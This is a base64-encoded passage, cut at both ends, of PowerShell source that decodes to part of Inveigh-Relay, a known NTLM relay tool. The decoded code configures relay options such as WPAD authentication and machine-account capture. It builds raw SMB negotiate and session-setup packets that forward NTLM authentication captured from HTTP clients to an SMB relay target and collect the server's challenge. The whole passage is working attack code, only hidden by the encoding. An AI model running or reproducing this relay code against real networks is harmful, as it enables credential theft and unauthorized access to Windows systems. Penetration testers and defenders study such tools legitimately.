bGVkIER1ZSBUbyBDZXJ0aWZpY2F0ZSBJbnN0YWxsIEVycm9yIikgID4gJG51bGwKICAgICAgICB9CgogICAgfQoKfQplbHNlCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFBTIENhcHR1cmUvUmVsYXkgPSBEaXNhYmxlZCIpICA+ICRudWxsCn0KCmlmKCRpbnZlaWdoLkhUVFAgLW9yICRpbnZlaWdoLkhUVFBTKQp7CgogICAgaWYoJENoYWxsZW5nZSkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJOVExNIENoYWxsZW5nZSA9ICRDaGFsbGVuZ2UiKSAgPiAkbnVsbAogICAgfQoKICAgIGlmKCRNYWNoaW5lQWNjb3VudHMgLWVxICdOJykKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJNYWNoaW5lIEFjY291bnQgQ2FwdHVyZSA9IERpc2FibGVkIikgPiAkbnVsbAogICAgICAgICRpbnZlaWdoLm1hY2hpbmVfYWNjb3VudHMgPSAkZmFsc2UKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzID0gJHRydWUKICAgIH0KCiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJXUEFEIEF1dGhlbnRpY2F0aW9uID0gJFdQQURBdXRoIikgPiAkbnVsbAoKfQoKJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU01CIFJlbGF5IFRhcmdldCA9ICRTTUJSZWxheVRhcmdldCIpID4gJG51bGwKCmlmKCRTTUJSZWxheVVzZXJuYW1lcykKewoKICAgIGlmKCRTTUJSZWxheVVzZXJuYW1lcy5Db3VudCAtZXEgMSkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJTTUIgUmVsYXkgVXNlcm5hbWUgPSAiICsgKCRTTUJSZWxheVVzZXJuYW1lcyAtam9pbiAiLCIpKSA+ICRudWxsCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU01CIFJlbGF5IFVzZXJuYW1lcyA9ICIgKyAoJFNNQlJlbGF5VXNlcm5hbWVzIC1qb2luICIsIikpID4gJG51bGwKICAgIH0KCn0KCmlmKCRTTUJSZWxheUF1dG9EaXNhYmxlIC1lcSAnWScpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlNNQiBSZWxheSBBdXRvIERpc2FibGUgPSBFbmFibGVkIikgPiAkbnVsbAp9CmVsc2UKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU01CIFJlbGF5IEF1dG8gRGlzYWJsZSA9IERpc2FibGVkIikgPiAkbnVsbAp9CgppZigkU01CUmVsYXlOZXR3b3JrVGltZW91dCkKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiU01CIFJlbGF5IE5ldHdvcmsgVGltZW91dCA9ICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IFNlY29uZHMiKSA+ICRudWxsCn0KCmlmKCRDb25zb2xlT3V0cHV0IC1lcSAnWScpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJlYWwgVGltZSBDb25zb2xlIE91dHB1dCA9IEVuYWJsZWQiKSA+ICRudWxsCiAgICAkaW52ZWlnaC5jb25zb2xlX291dHB1dCA9ICR0cnVlCn0KZWxzZQp7CgogICAgaWYoJGludmVpZ2gudG9vbCAtZXEgMSkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSZWFsIFRpbWUgQ29uc29sZSBPdXRwdXQgRGlzYWJsZWQgRHVlIFRvIEV4dGVybmFsIFRvb2wgU2VsZWN0aW9uIikgPiAkbnVsbAogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJlYWwgVGltZSBDb25zb2xlIE91dHB1dCA9IERpc2FibGVkIikgPiAkbnVsbAogICAgfQoKfQoKaWYoJEZpbGVPdXRwdXQgLWVxICdZJykKewoKICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgewogICAgICAgICRpbnZlaWdoLmZpbGVfb3V0cHV0ID0gJGZhbHNlICAgICAgCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guZmlsZV9vdXRwdXQgPSAkdHJ1ZQogICAgfQoKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJlYWwgVGltZSBGaWxlIE91dHB1dCA9IEVuYWJsZWQiKSA+ICRudWxsCiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJPdXRwdXQgRGlyZWN0b3J5ID0gJG91dHB1dF9kaXJlY3RvcnkiKSA+ICRudWxsCiAgICAkaW52ZWlnaC5maWxlX291dHB1dCA9ICR0cnVlCgp9CmVsc2UKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUmVhbCBUaW1lIEZpbGUgT3V0cHV0ID0gRGlzYWJsZWQiKSA+ICRudWxsCn0KCmlmKCRSdW5UaW1lIC1lcSAxKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSdW4gVGltZSA9ICRSdW5UaW1lIE1pbnV0ZSIpID4gJG51bGwKfQplbHNlaWYoJFJ1blRpbWUgLWd0IDEpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJ1biBUaW1lID0gJFJ1blRpbWUgTWludXRlcyIpID4gJG51bGwKfQoKaWYoJFNob3dIZWxwIC1lcSAnWScpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJ1biBTdG9wLUludmVpZ2ggdG8gc3RvcCBJbnZlaWdoLVJlbGF5IikgPiAkbnVsbAogICAgICAgIAogICAgaWYoJGludmVpZ2guY29uc29sZV9vdXRwdXQpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUHJlc3MgYW55IGtleSB0byBzdG9wIHJlYWwgdGltZSBjb25zb2xlIG91dHB1dCIpID4gJG51bGwKICAgIH0KCn0KCmlmKCRpbnZlaWdoLnN0YXR1c19vdXRwdXQpCnsKCiAgICB3aGlsZSgkaW52ZWlnaC5zdGF0dXNfcXVldWUuQ291bnQgLWd0IDApCiAgICB7CgogICAgICAgIGlmKCRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSkKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCgkaW52ZWlnaC5zdGF0dXNfcXVldWVbMF0gKyAkaW52ZWlnaC5uZXdsaW5lKQogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKCiAgICAgICAgICAgIHN3aXRjaCAtV2lsZGNhcmQgKCRpbnZlaWdoLnN0YXR1c19xdWV1ZVswXSkKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICIqIERpc2FibGVkIER1ZSBUbyAqIgogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAiUnVuIFN0b3AtSW52ZWlnaCB0byBzdG9wIEludmVpZ2gtUmVsYXkiCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZygkaW52ZWlnaC5zdGF0dXNfcXVldWVbMF0pCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgIldpbmRvd3MgRmlyZXdhbGwgPSBFbmFibGVkIgogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGRlZmF1bHQKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICB9CgogICAgfQoKfQoKJHByb2Nlc3NfSUQgPSBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdOjpHZXRDdXJyZW50UHJvY2VzcygpIHwgU2VsZWN0LU9iamVjdCAtZXhwYW5kIGlkCiRwcm9jZXNzX0lEID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwcm9jZXNzX0lEKSkKJHByb2Nlc3NfSUQgPSAkcHJvY2Vzc19JRCAtcmVwbGFjZSAiLTAwLTAwIiwiIgpbQnl0ZVtdXSRpbnZlaWdoLnByb2Nlc3NfSURfYnl0ZXMgPSAkcHJvY2Vzc19JRC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CgojIEJlZ2luIFNjcmlwdEJsb2NrcwoKIyBTaGFyZWQgQmFzaWMgZnVuY3Rpb25zIFNjcmlwdEJsb2NrCiRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrID0KewoKICAgIGZ1bmN0aW9uIERhdGFMZW5ndGgyCiAgICB7CiAgICAgICAgcGFyYW0gKFtJbnRdJGxlbmd0aF9zdGFydCxbQnl0ZVtdXSRzdHJpbmdfZXh0cmFjdF9kYXRhKQoKICAgICAgICAkc3RyaW5nX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9VSW50MTYoJHN0cmluZ19leHRyYWN0X2RhdGFbJGxlbmd0aF9zdGFydC4uKCRsZW5ndGhfc3RhcnQgKyAxKV0sMCkKICAgICAgICByZXR1cm4gJHN0cmluZ19sZW5ndGgKICAgIH0KCiAgICBmdW5jdGlvbiBEYXRhTGVuZ3RoNAogICAgewogICAgICAgIHBhcmFtIChbSW50XSRsZW5ndGhfc3RhcnQsW0J5dGVbXV0kc3RyaW5nX2V4dHJhY3RfZGF0YSkKCiAgICAgICAgJHN0cmluZ19sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvVUludDMyKCRzdHJpbmdfZXh0cmFjdF9kYXRhWyRsZW5ndGhfc3RhcnQuLigkbGVuZ3RoX3N0YXJ0ICsgMyldLDApCiAgICAgICAgcmV0dXJuICRzdHJpbmdfbGVuZ3RoCiAgICB9CgogICAgZnVuY3Rpb24gRGF0YVRvU3RyaW5nCiAgICB7CiAgICAgICAgcGFyYW0gKFtJbnRdJHN0cmluZ19zdGFydCxbSW50XSRzdHJpbmdfbGVuZ3RoLFtCeXRlW11dJHN0cmluZ19leHRyYWN0X2RhdGEpCgogICAgICAgICRzdHJpbmdfZGF0YSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHN0cmluZ19leHRyYWN0X2RhdGFbJHN0cmluZ19zdGFydC4uKCRzdHJpbmdfc3RhcnQgKyAkc3RyaW5nX2xlbmd0aCAtIDEpXSkKICAgICAgICAkc3RyaW5nX2RhdGEgPSAkc3RyaW5nX2RhdGEgLXJlcGxhY2UgIi0wMCIsIiIKICAgICAgICAkc3RyaW5nX2RhdGEgPSAkc3RyaW5nX2RhdGEuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRzdHJpbmdfZXh0cmFjdCA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJHN0cmluZ19kYXRhLDAsJHN0cmluZ19kYXRhLkxlbmd0aCkKICAgICAgICByZXR1cm4gJHN0cmluZ19leHRyYWN0CiAgICB9Cgp9CgojIFNNQiBOVExNIGZ1bmN0aW9ucyBTY3JpcHRCbG9jayAtIGZ1bmN0aW9uIGZvciBwYXJzaW5nIE5UTE0gY2hhbGxlbmdlL3Jlc3BvbnNlCiRTTUJfTlRMTV9mdW5jdGlvbnNfc2NyaXB0YmxvY2sgPQp7CiAgICBmdW5jdGlvbiBTTUJOVExNQ2hhbGxlbmdlCiAgICB7CiAgICAgICAgcGFyYW0gKFtCeXRlW11dJHBheWxvYWRfYnl0ZXMpCgogICAgICAgICRwYXlsb2FkID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkcGF5bG9hZF9ieXRlcykKICAgICAgICAkcGF5bG9hZCA9ICRwYXlsb2FkIC1yZXBsYWNlICItIiwiIgogICAgICAgICROVExNX2luZGV4ID0gJHBheWxvYWQuSW5kZXhPZigiNEU1NDRDNEQ1MzUzNTAwMCIpCgogICAgICAgIGlmKCRwYXlsb2FkLlN1YlN0cmluZygoJE5UTE1faW5kZXggKyAxNiksOCkgLWVxICIwMjAwMDAwMCIpCiAgICAgICAgewogICAgICAgICAgICAkTlRMTV9jaGFsbGVuZ2UgPSAkcGF5bG9hZC5TdWJTdHJpbmcoKCROVExNX2luZGV4ICsgNDgpLDE2KQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICROVExNX2NoYWxsZW5nZQogICAgfQoKfQoKIyBTTUIgUmVsYXkgQ2hhbGxlbmdlIFNjcmlwdEJsb2NrIC0gZ2F0aGVycyBOVExNIHNlcnZlciBjaGFsbGVuZ2UgZnJvbSByZWxheSB0YXJnZXQKJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc2NyaXB0YmxvY2sgPQp7CiAgICBmdW5jdGlvbiBTTUJSZWxheUNoYWxsZW5nZQogICAgewogICAgICAgIHBhcmFtICgkU01CX3JlbGF5X3NvY2tldCwkSFRUUF9yZXF1ZXN0X2J5dGVzKQoKICAgICAgICBpZiAoJFNNQl9yZWxheV9zb2NrZXQpCiAgICAgICAgewogICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdHJlYW0gPSAkU01CX3JlbGF5X3NvY2tldC5HZXRTdHJlYW0oKQogICAgICAgIH0KICAgICAgICAKICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9ieXRlcyA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSAxMDI0CiAgICAgICAgJGkgPSAwCiAgICAgICAgCiAgICAgICAgOlNNQl9yZWxheV9jaGFsbGVuZ2VfbG9vcCB3aGlsZSAoJGkgLWx0IDIpCiAgICAgICAgewogICAgICAgIAogICAgICAgICAgICBzd2l0Y2ggKCRpKQogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgMAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3NlbmQgPSAweDAwLDB4MDAsMHgwMCwweDJmLDB4ZmYsMHg1MywweDRkLDB4NDIsMHg3MiwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDE4LDB4MDEsMHg0OCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHhmZiwweGZmICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDBjLDB4MDAsMHgwMiwweDRlLDB4NTQsMHgyMCwweDRjLDB4NGQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MjAsMHgzMCwweDJlLDB4MzEsMHgzMiwweDAwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIDEKICAgICAgICAgICAgICAgIHsgCiAgICAgICAgICAgICAgICAgICAgJFNNQl9sZW5ndGhfMSA9ICcweHswOlgyfScgLWYgKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgMzIpCiAgICAgICAgICAgICAgICAgICAgJFNNQl9sZW5ndGhfMiA9ICcweHswOlgyfScgLWYgKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgMjIpCiAgICAgICAgICAgICAgICAgICAgJFNNQl9sZW5ndGhfMyA9ICcweHswOlgyfScgLWYgKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgMikKICAgICAgICAgICAgICAgICAgICAkU01CX05UTE1TU1BfbGVuZ3RoID0gJzB4ezA6WDJ9JyAtZiAoJEhUVFBfcmVxdWVzdF9ieXRlcy5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgJFNNQl9ibG9iX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLkxlbmd0aCArIDM0KSkKICAgICAgICAgICAgICAgICAgICAkU01CX2Jsb2JfbGVuZ3RoID0gJFNNQl9ibG9iX2xlbmd0aCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICAgICAgICAgICAgICRTTUJfYmxvYl9sZW5ndGggPSAkU01CX2Jsb2JfbGVuZ3RoLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAgICAgICAgICAgICAkU01CX2J5dGVfY291bnQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJEhUVFBfcmVxdWVzdF9ieXRlcy5MZW5ndGggKyA0NSkpCiAgICAgICAgICAgICAgICAgICAgJFNNQl9ieXRlX2NvdW50ID0gJFNNQl9ieXRlX2NvdW50IC1yZXBsYWNlICItMDAtMDAiLCIiCiAgICAgICAgICAgICAgICAgICAgJFNNQl9ieXRlX2NvdW50ID0gJFNNQl9ieXRlX2NvdW50LlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAgICAgICAgICAgICAkU01CX25ldGJpb3NfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgMTA0KSkKICAgICAgICAgICAgICAgICAgICAkU01CX25ldGJpb3NfbGVuZ3RoID0gJFNNQl9uZXRiaW9zX2xlbmd0aCAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICAgICAgICAgICAgICRTTUJfbmV0Ymlvc19sZW5ndGggPSAkU01CX25ldGJpb3NfbGVuZ3RoLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAgICAgICAgICAgICBbQXJyYXldOjpSZXZlcnNlKCRTTUJfbmV0Ymlvc19sZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc2VuZCA9IDB4MDAsMHgwMCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbmV0Ymlvc19sZW5ndGggKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGZmLDB4NTMsMHg0ZCwweDQyLDB4NzMsMHgwMCwweDAwLDB4MDAsMHgwMCwweDE4LDB4MDEsMHg0OCwweDAwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHhmZiwweGZmICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gucHJvY2Vzc19JRF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwYywweGZmLDB4MDAsMHgwMCwweDAwLDB4ZmYsMHhmZiwweDAyLDB4MDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9ibG9iX2xlbmd0aCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHg0NCwweDAwLDB4MDAsMHg4MCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfYnl0ZV9jb3VudCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NjAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2xlbmd0aF8xICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwNiwweDA2LDB4MmIsMHgwNiwweDAxLDB4MDUsMHgwNSwweDAyLDB4YTAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2xlbmd0aF8yICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgzMCwweDNjLDB4YTAsMHgwZSwweDMwLDB4MGMsMHgwNiwweDBhLDB4MmIsMHgwNiwweDAxLDB4MDQsMHgwMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4MiwweDM3LDB4MDIsMHgwMiwweDBhLDB4YTIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2xlbmd0aF8zICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwNCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfTlRMTVNTUF9sZW5ndGggKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSFRUUF9yZXF1ZXN0X2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1NSwweDZlLDB4NjksMHg3OCwweDAwLDB4NTMsMHg2MSwweDZkLDB4NjIsMHg2MSwweDAwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICB9CgogICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdHJlYW0uV3JpdGUoJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc2VuZCwwLCRTTUJfcmVsYXlfY2hhbGxlbmdlX3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAkU01CX3JlbGF5X2NoYWxsZW5nZV9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYoJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3RpbWVvdXQgPSBOZXctVGltZVNwYW4gLVNlY29uZHMgJFNNQlJlbGF5TmV0d29ya1RpbWVvdXQKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSghJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RyZWFtLkRhdGFBdmFpbGFibGUpCiAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfcmVsYXlfY2hhbGxlbmdlX3N0b3B3YXRjaC5FbGFwc2VkIC1nZSAkU01CX3JlbGF5X2NoYWxsZW5nZV90aW1lb3V0KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSB0YXJnZXQgZGlkbid0IHJlc3BvbmQgd2l0aGluICRTTUJSZWxheU5ldHdvcmtUaW1lb3V0IHNlY29uZHMiKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgdGFyZ2V0IGRpZG4ndCByZXNwb25kIHdpdGhpbiAkU01CUmVsYXlOZXR3b3JrVGltZW91dCBzZWNvbmRzIildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsgU01CX3JlbGF5X2NoYWxsZW5nZV9sb29wCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAKICAgICAgICAgICAgJFNNQl9yZWxheV9jaGFsbGVuZ2Vfc3RyZWFtLlJlYWQoJFNNQl9yZWxheV9jaGFsbGVuZ2VfYnl0ZXMsMCwkU01CX3JlbGF5X2NoYWxsZW5nZV9ieXRlcy5MZW5ndGgpCiAgICAgICAgICAgICRpKysKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuICRTTUJfcmVsYXlfY2hhbGxlbmdlX2J5dGVzCiAgICB9Cgp9CgojIFNNQiBSZWxheSBSZXNwb25zZSBTY3JpcHRCbG9jayAtIHNlbmRzIE5UTE0gcmVwb25zZSB0byByZWxheSB0YXJnZXQKJFNNQl9yZWxheV9yZXNwb25zZV9zY3JpcHRibG9jayA9CnsKICAgIGZ1bmN0aW9uIFNNQlJlbGF5UmVzcG9uc2UKICAgIHsKICAgICAgICBwYXJhbSAoJFNNQl9yZWxheV9zb2NrZXQsJEhUVFBfcmVxdWVzdF9ieXRlcywkU01CX3VzZXJfSUQpCiAgICAKICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX2J5dGVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQKCiAgICAgICAgaWYgKCRTTUJfcmVsYXlfc29ja2V0KQogICAgICAgIHsKICAgICAgICAgICAgJFNNQl9yZWxheV9yZXNwb25zZV9zdHJlYW0gPSAkU01CX3JlbGF5X3NvY2tldC5HZXRTdHJlYW0oKQogICAgICAgIH0KCiAgICAgICAgJFNNQl9sZW5ndGhfMSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF9yZXF1ZXN0X2J5dGVzLkxlbmd0aCArIDEyKSkKICAgICAgICAkU01CX2xlbmd0aF8xID0gJFNNQl9sZW5ndGhfMSAtcmVwbGFjZSAiLTAwLTAwIiwiIgogICAgICAgICRTTUJfbGVuZ3RoXzEgPSAkU01CX2xlbmd0aF8xLlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAkU01CX2xlbmd0aF8yID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRIVFRQX3JlcXVlc3RfYnl0ZXMuTGVuZ3RoICsgOCkpCi